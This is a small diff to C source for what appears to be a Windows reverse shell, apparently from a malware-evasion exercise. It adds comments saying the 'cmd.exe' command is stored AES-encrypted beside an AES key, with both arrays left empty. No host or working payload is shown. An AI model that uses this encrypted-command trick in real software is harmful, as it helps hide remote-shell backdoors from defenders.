@@ -17,9 +17,11 @@ struct sockaddr_in hax;
 STARTUPINFO sui;
 PROCESS_INFORMATION pi;
 
+// encrypted command cmd.exe (with AES)
 unsigned char myCmd[] = { };
 unsigned int myCmdL = sizeof(myCmd);
 
+// AES key
 unsigned char mySecretKey[] = { };
 
 // AES decrypt
